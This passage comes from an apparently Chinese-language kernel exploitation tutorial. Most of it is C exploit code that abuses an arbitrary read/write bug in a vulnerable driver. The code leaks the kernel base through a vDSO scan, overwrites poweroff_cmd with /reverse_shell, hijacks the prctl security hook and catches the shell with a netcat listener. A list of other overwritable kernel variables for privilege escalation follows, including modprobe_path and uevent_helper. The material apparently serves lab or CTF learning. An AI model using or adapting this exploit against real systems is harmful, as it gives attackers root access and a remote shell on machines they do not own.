	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}


int main()
{
	int fd=-1;
	size_t result=0;
	size_t addr=0;
	struct init_args i_args;
	struct realloc_args rello_args;

	size_t kernel_base=0;
    size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0      可通过cat /proc/kallsyms | grep selinux_disable找到
    size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8         这是一个虚表的位置,通过调试security_task_prctl 得到
    size_t order_cmd=0xe4cf40;       //  poweroff_cmd函数,通过cat /proc/kallsyms | grep poweroff_cmd 查找
    size_t poweroff_work_addr=0xa7590; //     poweroff_work函数,通过 cat /proc/kallsyms | grep poweroff_work 查找
	
	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	fd=open(PATH,O_RDWR);           //  首先打开驱动 /dev/vulnerable_device
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
    // 构造任意地址读写
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	//爆破VDSO地址，泄露kernel_base
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);
		if (!strcmp("gettimeofday",buf+0x2cd))      //通过字符串偏移找到vdso地址
		{
			result=addr;
			printf("[+] found vdso 0x%lx\n",result);
			break;
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
    // 根据VDSO地址得到 kernel_base 
    kernel_base=result & 0xffffffffff000000;
    selinux_disable_addr+=kernel_base;
    prctl_hook+=kernel_base;
    order_cmd+=kernel_base;
    poweroff_work_addr+=kernel_base;
    printf("[+] found kernel_base: %p\n",kernel_base);                          // 通过vdso位置找到内核基地址
    printf("[+] found prctl_hook: %p\n",prctl_hook);                            //虚表的位置,通过调试security_task_prctl得到
    printf("[+] found order_cmd: %p\n",order_cmd);                              // poweroff_cmd 函数
    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);        //selinux_disable 函数
    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);            // poweroff_work 函数

    // 修改 run_cmd变量
    memset(buf,'\x00',0x1000);
    strcpy(buf,"/reverse_shell\0");
    write_mem(fd,order_cmd, buf,strlen(buf)+1);     // 将ordercmd命令改写为/reverse_shell

    // 劫持prctl_hook去执行poweroff_work
    memset(buf,'\x00',0x1000);
    *(size_t *)buf = poweroff_work_addr;
    write_mem(fd,prctl_hook, buf, 8);       // 将prctl_hook 劫持为 poweroff_work

    //需要fork()子进程来执行reverse_shell程序
    if (fork()==0){
    	prctl(addr,2,addr,addr,2);              //其实是执行了    /reverse_shell
    	exit(-1);
    }
    system("nc -l -p 2333");                    // 父进程开启监听
	return 0;
}
```

#### 其他可劫持的变量
不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。

1. modprobe_path

```
// /kernel/kmod.c
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
// /kernel/kmod.c
static int call_modprobe(char *module_name, int wait) 
    argv[0] = modprobe_path;
    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
                     NULL, free_modprobe_argv, NULL);
    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
// /kernel/kmod.c
int __request_module(bool wait, const char *fmt, ...)
    ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
```
__request_module - try to load a kernel module

触发：可通过执行错误格式的elf文件来触发执行modprobe_path指定的文件。

2. poweroff_cmd

```
// /kernel/reboot.c
char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
// /kernel/reboot.c
static int run_cmd(const char *cmd)
    argv = argv_split(GFP_KERNEL, cmd, NULL);
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
// /kernel/reboot.c
static int __orderly_poweroff(bool force)    
    ret = run_cmd(poweroff_cmd);
```
触发：执行__orderly_poweroff()即可。

3. uevent_helper

```
// /lib/kobject_uevent.c
#ifdef CONFIG_UEVENT_HELPER
char uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;
// /lib/kobject_uevent.c
static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
{  ......
    env->argv[0] = uevent_helper; 
  ...... }
// /lib/kobject_uevent.c
int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
               char *envp_ext[])
{......
    retval = init_uevent_argv(env, subsystem);
    info = call_usermodehelper_setup(env->argv[0], env->argv,
                         env->envp, GFP_KERNEL,
                         NULL, cleanup_uevent_env, env);
......}
```

4. ocfs2_hb_ctl_path

```
// /fs/ocfs2/stackglue.c
static char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";
// /fs/ocfs2/stackglue.c
static void ocfs2_leave_group(const char *group)
    argv[0] = ocfs2_hb_ctl_path;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

5. nfs_cache_getent_prog

```
// /fs/nfs/cache_lib.c
static char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] =
                "/sbin/nfs_cache_getent";
// /fs/nfs/cache_lib.c
int nfs_cache_upcall(struct cache_detail *cd, char *entry_name)
    char *argv[] = {
        nfs_cache_getent_prog,
        cd->name,
        entry_name,
        NULL
    };
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
```

6. cltrack_prog

```
// /fs/nfsd/nfs4recover.c
static char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";
// /fs/nfsd/nfs4recover.c
static int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1)
    argv[0] = (char *)cltrack_prog;
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```